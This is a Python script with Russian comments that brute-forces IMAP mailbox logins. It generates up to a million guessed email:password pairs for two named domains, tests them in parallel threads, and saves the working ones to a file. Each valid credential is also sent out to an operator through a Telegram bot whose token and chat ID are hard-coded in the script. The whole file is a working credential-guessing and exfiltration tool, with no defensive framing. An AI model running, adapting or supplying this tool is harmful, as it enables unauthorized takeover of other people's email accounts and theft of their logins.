import random
import imaplib
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor

# Настройки для Telegram Bot API
TELEGRAM_BOT_TOKEN = "7859317490:AAHi6lghknwbKU0fPHULZKyl42aGcG1lNyM"
CHAT_ID = '7412395676'

# Глобальные счетчики
checked_count = 0
not_found_count = 0

# Функция для отправки сообщения в Telegram
def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Ошибка отправки сообщения в Telegram: {e}")

# Функция для записи аккаунтов в файл
def save_to_file(filename, content):
    try:
        with open(filename, 'a') as file:  # 'a' означает, что файл открывается в режиме добавления
            file.write(content + '\n')
    except Exception as e:
        print(f"Ошибка записи в файл {filename}: {e}")

# Генерация email:password для jlchacha.com
def generate_emails_jlchacha():
    numbers = list(range(1000000))  # Числа от 000000 до 999999
    random.shuffle(numbers)
    with open('emails_jlchacha.txt', 'w') as file:
        for number in numbers:
            formatted_number = f"{number:06}"
            email = f"jl{formatted_number}@jlchacha.com:chacha123\n"
            file.write(email)

# Генерация email:password для dd8688.shop
def generate_emails_dd8688():
    numbers = list(range(100000))
    random.shuffle(numbers)
    with open('emails_dd8688.txt', 'w') as file:
        for number in numbers:
            formatted_number = f"{number:05}"
            email = f"up{formatted_number}@dd8688.shop:367498\n"
            file.write(email)

# Проверка логина по IMAP
def check_imap_login(email, password, imap_server, imap_port=993):
    global checked_count, not_found_count
    try:
        context = ssl.create_default_context()
        mail = imaplib.IMAP4_SSL(imap_server, imap_port, ssl_context=context)
        mail.login(email, password)
        mail.logout()
        # Если логин успешный
        valid_message = f"[VALID] {email}:{password}"
        send_telegram_message(valid_message)
        print(valid_message)
        # Сохраняем валидный аккаунт в файл valid_accounts.txt
        save_to_file('valid_accounts.txt', f"{email}:{password}")
        # Обнуляем счётчик не найденных аккаунтов
        not_found_count = 0
        return True
    except imaplib.IMAP4.error:
        # Сохраняем проверенный аккаунт в файл checked_accounts.txt
        save_to_file('checked_accounts.txt', f"{email}:{password}")
        # Увеличиваем счётчики
        checked_count += 1
        not_found_count += 1
        # Каждые 50 проверок отправляем сообщение, если не нашлось валидных аккаунтов
        if checked_count % 50 == 0 and not_found_count >= 50:
            send_telegram_message(f"Проверено {checked_count} аккаунтов, валидных не найдено.")
            # Обнуляем счётчик не найденных валидов после отправки сообщения
            not_found_count = 0
        return False
    except Exception as e:
        print(f"Ошибка: {e}")
        return False

# Многопоточная проверка email из файла
def check_emails_from_file(filename, imap_server, threads=10, imap_port=993):
    with open(filename, 'r') as file:
        emails = [line.strip().split(':') for line in file]
    # Используем ThreadPoolExecutor для многопоточности
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_imap_login, email, password, imap_server, imap_port): (email, password) for email, password in emails}
        for future in futures:
            try:
                future.result()  # Это будет блокировать, пока проверка не завершится
            except Exception as e:
                print(f"Ошибка при проверке {futures[future]}: {e}")

# Генерация email и паролей
generate_emails_jlchacha()  # Генерация для домена jlchacha.com
generate_emails_dd8688()  # Генерация для домена dd8688.shop

# Многопоточная проверка сгенерированных email через IMAP
# Для домена jlchacha.com
imap_server_jl = 'imap.jlchacha.com'
check_emails_from_file('emails_jlchacha.txt', imap_server_jl, threads=10)

# Для домена dd8688.shop
imap_server_dd = 'imap.dd8688.shop'
check_emails_from_file('emails_dd8688.txt', imap_server_dd, threads=10)
